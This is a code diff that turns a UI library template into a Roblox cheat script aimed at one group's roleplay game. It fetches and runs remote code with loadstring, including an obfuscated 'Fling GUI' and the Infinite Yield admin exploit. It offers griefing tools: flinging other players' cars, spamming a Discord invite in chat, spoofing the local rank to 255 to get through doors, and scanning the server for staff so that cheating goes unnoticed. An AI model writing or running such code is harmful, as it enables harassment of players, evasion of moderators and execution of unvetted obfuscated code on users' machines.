@@ -1,14 +1,229 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "Title of the library", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local groupId = 10261023
+local rankNames = {
+    "Junior Director", "Senior Director", "Head Director", "Corporate Intern", 
+    "Junior Corporate", "Senior Corporate", "Head Corporate", "Chief Human Resources Officer",
+    "Chief Public Relations Officer", "Chief Operating Officer", "Chief Administrative Officer",
+    "Developer", "Vice Chairman", "Chairman"
+}
 
-local Tab = Window:MakeTab({
-	Name = "Tab 1",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
+local isSpamming = false
 
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
+local function sendNotification(title, message)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = message,
+        Duration = 8
+    })
+end
+
+local function countHRPlayers()
+    local hrCount = 0
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        local success, rank = pcall(function()
+            return player:GetRoleInGroup(groupId)
+        end)
+        if success then
+            for _, rankName in ipairs(rankNames) do
+                if rankName == rank then
+                    hrCount = hrCount + 1
+                    break
+                end
+            end
+        end
+    end
+    return hrCount
+end
+
+local function checkAndNotifyHR(player)
+    local success, rank = pcall(function()
+        return player:GetRoleInGroup(groupId)
+    end)
+    if success then
+        for _, rankName in ipairs(rankNames) do
+            if rankName == rank then
+                sendNotification("HR Join", player.Name .. " (" .. rank .. ") has joined the game.")
+                break
+            end
+        end
+    end
+end
+
+local function spamChat()
+    while isSpamming do
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(". g g / washieztroll", "All")
+        wait(1)
+    end
+end
+
+-- Connect the PlayerAdded event to the checkAndNotifyHR function
+game.Players.PlayerAdded:Connect(checkAndNotifyHR)
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("MADE BY npc", "Ocean")
+local Tab = Window:NewTab("Main Page")
+local Section = Tab:NewSection("Main Page")
+
+local function flingAll()
+    for _, v in pairs(workspace.SpawnedCars:GetChildren()) do
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.PrimaryPart.CFrame
+        task.wait(0.1)
+    end
+end
+
+Section:NewButton("Fling All", "Teleports to users cars and flings them. MUST USE WITH FLING GUI!", function()
+    flingAll()
+end)
+
+Section:NewButton("Fling GUI", "Simple, yet helpful, Fling GUI", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
+end)
+
+Section:NewButton("Infinite Yield", "Basic Commands", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+Section:NewButton("Open Any Door (client-sided)", "Lets you through any door (client sided)", function()
+    game.Players.LocalPlayer.GroupInfo.Rank.Value = 255
+end)
+
+Section:NewButton("Scan for HR's!", "Scans for any In-Game HR's. Junior Director+", function()
+    local hrPlayers = countHRPlayers()
+    if (hrPlayers > 0) then
+        sendNotification("HR SCAN", "There are " .. hrPlayers .. " HR's in-game.")
+    else
+        sendNotification("HR SCAN", "No HR's found in-game.")
+    end
+end)
+
+-- MR Scan button
+Section:NewButton("Scan for MR's!", "Scans for any In-Game MR's. Shift Leader, Supervisor, Assistant Manager, General Manager", function()
+    local mrRankNames = {"Shift Leader", "Supervisor", "Assistant Manager", "General Manager"}
+    
+    local function countMRPlayers()
+        local mrCount = 0
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            local success, rank = pcall(function()
+                return player:GetRoleInGroup(groupId)
+            end)
+            if success then
+                for _, rankName in ipairs(mrRankNames) do
+                    if rankName == rank then
+                        mrCount = mrCount + 1
+                        break
+                    end
+                end
+            end
+        end
+        return mrCount
+    end
+
+    local mrPlayers = countMRPlayers()
+    if (mrPlayers > 0) then
+        sendNotification("MR SCAN", "There are " .. mrPlayers .. " MR's in-game.")
+    else
+        sendNotification("MR SCAN", "No MR's found in-game.")
+    end
+end)
+
+local spamButton = Section:NewToggle("Spam Discord Invite", "Toggles to Spam the Discord Invite", function(state)
+    isSpamming = state
+    if (isSpamming) then
+        spamChat()
+    end
+end)
+
+local TabTeleporters = Window:NewTab("Teleporters")
+local SectionTeleporters = TabTeleporters:NewSection("Teleporters")
+
+SectionTeleporters:NewButton("Middle Area", "ButtonInfo", function()
+    local targetPosition = Vector3.new(351, 4, 100)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTeleporters:NewButton("Cafe", "ButtonInfo", function()
+    local targetPosition = Vector3.new(463, 4, 206)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTeleporters:NewButton("Gas Station", "ButtonInfo", function()
+    local targetPosition = Vector3.new(494, 3, -181)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTeleporters:NewButton("Headquarters", "ButtonInfo", function()
+    local targetPosition = Vector3.new(-46, 4, -201)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTeleporters:NewButton("Secret Room", "ButtonInfo", function()
+    local targetPosition = Vector3.new(-130, -15, -201)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTeleporters:NewButton("Prison Outdoor", "ButtonInfo", function()
+    local targetPosition = Vector3.new(257, 3, -504)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTeleporters:NewButton("Prison Indoor", "ButtonInfo", function()
+    local targetPosition = Vector3.new(267, 4, -570)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTeleporters:NewButton("Raceway", "ButtonInfo", function()
+    local targetPosition = Vector3.new(449, 27, 470)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTeleporters:NewButton("Spawn", "ButtonInfo", function()
+    local targetPosition = Vector3.new(-106, 4, 99)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTeleporters:NewButton("Staff Spawn", "ButtonInfo", function()
+    local targetPosition = Vector3.new(294, 4, -192)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+local TabTrainingTeleporters = Window:NewTab("Training Teleporters")
+local SectionTrainingTeleporters = TabTrainingTeleporters:NewSection("Training Teleporters")
+
+SectionTrainingTeleporters:NewButton("Group A", "ButtonInfo", function()
+    local targetPosition = Vector3.new(-473, 4, -315)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTrainingTeleporters:NewButton("Group B", "ButtonInfo", function()
+    local targetPosition = Vector3.new(-565, 4, -313)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTrainingTeleporters:NewButton("Group C", "ButtonInfo", function()
+    local targetPosition = Vector3.new(-657, 4, -314)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTrainingTeleporters:NewButton("Group D", "ButtonInfo", function()
+    local targetPosition = Vector3.new(-473, 4, -418)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTrainingTeleporters:NewButton("Group E", "ButtonInfo", function()
+    local targetPosition = Vector3.new(-564, 4, -420)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+SectionTrainingTeleporters:NewButton("Group F", "ButtonInfo", function()
+    local targetPosition = Vector3.new(-656, 4, -419)
+    game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+end)
+
+-- Start spamming Discord invite when script runs
+if (isSpamming) then
+    spamChat()
+end
+
+-- Initial HR check on script execution
+for _, player in ipairs(game.Players:GetPlayers()) do
+    checkAndNotifyHR(player)
+end
